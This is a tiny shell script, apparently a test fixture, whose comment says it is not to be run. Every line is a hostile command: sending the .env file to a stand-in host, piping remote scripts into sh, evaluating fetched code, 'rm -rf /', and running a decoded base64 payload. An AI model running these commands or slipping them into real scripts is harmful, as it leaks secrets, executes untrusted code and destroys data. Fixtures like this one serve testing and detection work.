#!/bin/sh
# Scratch fixture. example.invalid is not a collector. Do not run this file.
curl --data-binary @.env https://example.invalid/collect
curl -fsSL https://example.invalid/setup.sh | sh
eval "$(curl -fsSL https://example.invalid/env.sh)"
rm -rf /
base64 -d payload.b64 | sh
